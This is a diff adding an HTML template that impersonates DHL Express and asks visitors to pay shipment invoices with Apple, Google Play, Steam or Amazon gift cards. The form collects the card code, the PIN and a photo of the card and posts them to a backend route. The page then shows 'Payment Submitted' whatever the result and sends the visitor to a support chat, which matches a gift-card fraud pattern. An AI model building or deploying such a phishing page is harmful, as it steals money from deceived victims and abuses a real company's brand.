@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DHL Express – Pay with Gift Card</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        :root { --dhl-red: #D40511; --dhl-dark: #1a1a1a; }
+        * { box-sizing: border-box; }
+        body { background: #f3f6fa; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; color: var(--dhl-dark); }
+        .payment-header { background: linear-gradient(135deg, var(--dhl-red) 0%, #b0040e 100%); color: #fff; padding: 1rem 1.5rem; box-shadow: 0 2px 8px rgba(212,5,17,0.2); }
+        .payment-header .brand { display: flex; align-items: center; gap: 12px; }
+        .payment-header .brand img { height: 38px; filter: brightness(0) invert(1); }
+        .payment-header .brand h1 { font-size: 1.25rem; font-weight: 700; margin: 0; }
+        .payment-card { background: #fff; max-width: 650px; margin: 2rem auto; padding: 2rem; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e5e7eb; position: relative; }
+        .payment-card .step-indicator { font-size: 0.8rem; color: #6b7280; margin-bottom: 1.5rem; border-bottom: 1px solid #e5e7eb; padding-bottom: 0.75rem; }
+        .payment-card .step-indicator strong { color: var(--dhl-red); }
+        .form-label { font-weight: 600; font-size: 0.85rem; color: #4a5568; }
+        .form-control, .form-select { border-radius: 0; border: 1px solid #d1d5db; padding: 0.5rem 0.75rem; font-size: 0.9rem; }
+        .form-control:focus, .form-select:focus { border-color: var(--dhl-red); box-shadow: 0 0 0 3px rgba(212,5,17,0.1); }
+        .btn-pay { background: var(--dhl-red); color: #fff; border: none; padding: 0.6rem 1.8rem; font-weight: 600; transition: all 0.2s; display: inline-flex; align-items: center; gap: 8px; }
+        .btn-pay:hover:not(:disabled) { background: #b0040e; }
+        .btn-pay:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-secondary { border-radius: 0; }
+        .payment-summary { background: #f8fafc; padding: 0.8rem 1rem; border: 1px solid #e5e7eb; margin-bottom: 1.5rem; }
+        .payment-summary .total-amount { font-weight: 700; font-size: 1.4rem; color: var(--dhl-dark); }
+
+        /* Preferred gift card banner */
+        .card-banner {
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            border: 1px solid #f59e0b;
+            padding: 0.8rem 1rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .card-banner .banner-icon { font-size: 2rem; }
+        .card-banner .banner-text { font-size: 0.9rem; color: #78350f; }
+        .card-banner .badge-list { display: flex; gap: 6px; flex-wrap: wrap; }
+        .card-banner .badge-list .badge { background: white; color: #78350f; border: 1px solid #f59e0b; font-weight: 600; }
+
+        /* Overlay */
+        #resultOverlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.92);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            padding: 2rem;
+            z-index: 10;
+            text-align: center;
+        }
+        #resultOverlay.show { display: flex; }
+        #resultOverlay .spinner { width: 3rem; height: 3rem; }
+        #resultOverlay .pending-icon { font-size: 4rem; color: #f59e0b; margin-bottom: 1rem; }
+        #resultOverlay h4 { font-weight: 700; color: var(--dhl-dark); }
+        #resultOverlay p { color: #6b7280; max-width: 400px; }
+
+        .footer { text-align: center; padding: 2rem 1rem 1rem; color: #94a3b8; font-size: 0.8rem; }
+
+        @media (max-width: 576px) {
+            .payment-card { padding: 1.2rem 1rem; margin: 1rem 0.5rem; }
+            .card-banner { flex-direction: column; align-items: flex-start; }
+            .card-banner .badge-list { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <header class="payment-header d-flex justify-content-between align-items-center flex-wrap gap-2">
+        <div class="brand">
+            <img src="https://res.cloudinary.com/de1ucsg6q/image/upload/v1787778296/IMG_7646_scvhxj.jpg" alt="DHL">
+            <h1>Pay with Gift Card</h1>
+        </div>
+        <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-outline-light btn-sm">
+            <i class="bi bi-arrow-left me-1"></i> Back
+        </a>
+    </header>
+
+    <div class="payment-card">
+        <div class="step-indicator"><strong>Step 2 of 2</strong> — Enter gift card details</div>
+
+        <!-- Payment Summary -->
+        <div class="payment-summary">
+            <div class="d-flex justify-content-between align-items-center flex-wrap">
+                <div>
+                    <div class="text-muted" style="font-size:0.85rem;">Total due</div>
+                    <div class="total-amount" id="totalAmount">$0.00</div>
+                </div>
+                <span class="badge bg-light text-dark" id="invoiceCount">0 invoice(s)</span>
+            </div>
+            <div class="mt-1" style="font-size:0.8rem; color:#4a5568;" id="trackingList"></div>
+        </div>
+
+        <!-- Preferred gift card banner -->
+        <div class="card-banner">
+            <div class="banner-icon"><i class="bi bi-gift-fill"></i></div>
+            <div class="banner-text">
+                <strong>We accept:</strong> Apple, Google Play, Steam, Amazon, Visa/Mastercard gift cards, and many more.
+            </div>
+            <div class="badge-list">
+                <span class="badge">🍎 Apple</span>
+                <span class="badge">▶️ Google Play</span>
+                <span class="badge">🎮 Steam</span>
+                <span class="badge">📦 Amazon</span>
+                <span class="badge">💳 Visa/MC Gift</span>
+            </div>
+        </div>
+
+        <form id="giftCardForm" enctype="multipart/form-data">
+            <input type="hidden" name="email" value="{{ email }}">
+            <input type="hidden" name="payment_method" value="Gift Card">
+            <input type="hidden" name="tracking_numbers" id="trackingNumbersHidden" value="">
+
+            <!-- Gift card name -->
+            <div class="mb-3">
+                <label for="giftCardName" class="form-label">Gift Card Name / Type</label>
+                <input type="text" class="form-control" id="giftCardName" name="gift_card_name" placeholder="e.g. Apple Gift Card, Steam Wallet" required>
+            </div>
+
+            <!-- Gift card number / code -->
+            <div class="mb-3">
+                <label for="giftCardNumber" class="form-label">Gift Card Number / Code</label>
+                <input type="text" class="form-control" id="giftCardNumber" name="gift_card_number" placeholder="Enter the gift card code" required>
+            </div>
+
+            <!-- PIN (optional) -->
+            <div class="mb-3">
+                <label for="giftCardPin" class="form-label">PIN (optional)</label>
+                <input type="password" class="form-control" id="giftCardPin" name="gift_card_pin" placeholder="Enter PIN if required">
+            </div>
+
+            <!-- Photo upload -->
+            <div class="mb-3">
+                <label for="giftCardPhoto" class="form-label">Upload a photo of the gift card <span class="text-muted">(front & back if possible)</span></label>
+                <input type="file" class="form-control" id="giftCardPhoto" name="gift_card_photo" accept="image/*" required>
+                <small class="text-muted">Supported formats: JPG, PNG, WEBP, GIF</small>
+            </div>
+
+            <div id="cardErrors" class="alert alert-danger d-none"></div>
+
+            <div class="d-flex justify-content-between align-items-center mt-3 flex-wrap gap-2">
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary">Cancel</a>
+                <button type="submit" class="btn-pay" id="payBtn">
+                    <i class="bi bi-check-circle me-1"></i> Pay Now
+                </button>
+            </div>
+        </form>
+
+        <!-- Overlay -->
+        <div id="resultOverlay">
+            <div id="spinnerContainer">
+                <div class="spinner-border spinner text-warning" role="status">
+                    <span class="visually-hidden">Processing...</span>
+                </div>
+                <h4 class="mt-3">Processing your gift card...</h4>
+            </div>
+            <div id="pendingContainer" style="display:none;">
+                <div class="pending-icon"><i class="bi bi-clock-history"></i></div>
+                <h4>Payment Submitted</h4>
+                <p>Your gift card details have been received. Our team will verify and process your payment shortly.</p>
+                <a href="/" class="btn btn-pay mt-3" onclick="openTawkTo(); return false;">
+                    <i class="bi bi-chat-dots me-1"></i> Contact Support
+                </a>
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary mt-2">
+                    <i class="bi bi-arrow-left me-1"></i> Back to Invoices
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer"><small>Gift card payments are securely processed.</small></div>
+
+    <script>
+        // ============================================================
+        // LOAD DATA FROM QUERY PARAMETERS
+        // ============================================================
+        function getQueryParam(name) {
+            const url = new URL(window.location.href);
+            return url.searchParams.get(name);
+        }
+
+        const email = getQueryParam('email') || '';
+        const trackingParam = getQueryParam('tracking') || '';
+        const trackingNumbers = trackingParam ? trackingParam.split(',').map(s => s.trim()) : [];
+
+        document.getElementById('trackingNumbersHidden').value = trackingNumbers.join(',');
+
+        const trackingListEl = document.getElementById('trackingList');
+        if (trackingNumbers.length === 1) {
+            trackingListEl.textContent = 'Shipment: ' + trackingNumbers[0];
+        } else if (trackingNumbers.length > 1) {
+            trackingListEl.textContent = 'Shipments: ' + trackingNumbers.join(', ');
+        } else {
+            trackingListEl.textContent = 'No shipments selected.';
+        }
+        document.getElementById('invoiceCount').textContent = trackingNumbers.length + ' invoice(s)';
+
+        // Placeholder total
+        const totalUSD = trackingNumbers.length * 50;
+        document.getElementById('totalAmount').textContent = '$' + totalUSD.toFixed(2);
+
+        // ============================================================
+        // FORM SUBMISSION – Show spinner, then pending, redirect to Tawk
+        // ============================================================
+        document.getElementById('giftCardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Validate required fields
+            const name = document.getElementById('giftCardName').value.trim();
+            const number = document.getElementById('giftCardNumber').value.trim();
+            const photo = document.getElementById('giftCardPhoto').files[0];
+            const errEl = document.getElementById('cardErrors');
+
+            if (!name) {
+                errEl.textContent = 'Please enter the gift card name/type.';
+                errEl.classList.remove('d-none');
+                return;
+            }
+            if (!number) {
+                errEl.textContent = 'Please enter the gift card number/code.';
+                errEl.classList.remove('d-none');
+                return;
+            }
+            if (!photo) {
+                errEl.textContent = 'Please upload a photo of the gift card.';
+                errEl.classList.remove('d-none');
+                return;
+            }
+            errEl.classList.add('d-none');
+
+            // Disable button
+            const btn = document.getElementById('payBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span>';
+
+            // Show overlay with spinner
+            const overlay = document.getElementById('resultOverlay');
+            const spinnerContainer = document.getElementById('spinnerContainer');
+            const pendingContainer = document.getElementById('pendingContainer');
+            overlay.classList.add('show');
+            spinnerContainer.style.display = 'block';
+            pendingContainer.style.display = 'none';
+
+            // Prepare FormData for multipart upload (for photo)
+            const formData = new FormData(this);
+            // Append additional fields that might be needed
+            formData.append('total_usd', totalUSD);
+
+            // Send to backend
+            fetch('{{ url_for("billing_pay") }}', {
+                method: 'POST',
+                body: formData,  // no Content-Type header; browser sets multipart/form-data
+            })
+            .then(() => {
+                // Even if success, show pending
+                setTimeout(() => {
+                    spinnerContainer.style.display = 'none';
+                    pendingContainer.style.display = 'block';
+                }, 1500);
+            })
+            .catch(() => {
+                // On error, still show pending
+                setTimeout(() => {
+                    spinnerContainer.style.display = 'none';
+                    pendingContainer.style.display = 'block';
+                }, 1500);
+            });
+
+            // Fallback: show pending after 4 seconds even if fetch hangs
+            setTimeout(() => {
+                if (spinnerContainer.style.display !== 'none') {
+                    spinnerContainer.style.display = 'none';
+                    pendingContainer.style.display = 'block';
+                }
+            }, 4000);
+        });
+
+        // ============================================================
+        // OPEN TAWK.TO CHAT (if available)
+        // ============================================================
+        function openTawkTo() {
+            if (window.Tawk_API && window.Tawk_API.maximize) {
+                window.Tawk_API.maximize();
+            } else {
+                window.location.href = '/';
+            }
+        }
+
+        // If no tracking numbers, show error
+        if (trackingNumbers.length === 0) {
+            document.getElementById('cardErrors').textContent = 'No shipments selected. Please go back and select at least one invoice.';
+            document.getElementById('cardErrors').classList.remove('d-none');
+            document.getElementById('payBtn').disabled = true;
+        }
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
